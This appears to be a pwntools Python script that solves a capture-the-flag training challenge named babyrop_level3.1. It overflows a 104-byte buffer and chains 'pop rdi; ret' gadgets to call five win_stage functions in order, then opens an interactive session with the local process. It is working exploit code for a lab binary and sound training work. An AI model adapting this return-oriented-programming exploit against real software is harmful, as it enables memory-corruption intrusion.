from pwn import *

binary = "/challenge/babyrop_level3.1"
e = context.binary = ELF(binary)

chain = b'A'*104

chain += p64(0x00401833) # pop rdi ; ret
chain += p64(1)
chain += p64(e.sym['win_stage_1'])

chain += p64(0x00401833) # pop rdi ; ret
chain += p64(2)
chain += p64(e.sym['win_stage_2'])

chain += p64(0x00401833) # pop rdi ; ret
chain += p64(3)
chain += p64(e.sym['win_stage_3'])

chain += p64(0x00401833) # pop rdi ; ret
chain += p64(4)
chain += p64(e.sym['win_stage_4'])

chain += p64(0x00401833) # pop rdi ; ret
chain += p64(5)
chain += p64(e.sym['win_stage_5'])

p = process("./babyrop_level3.1")
p.recvuntil("###")
p.sendline(chain)
p.interactive()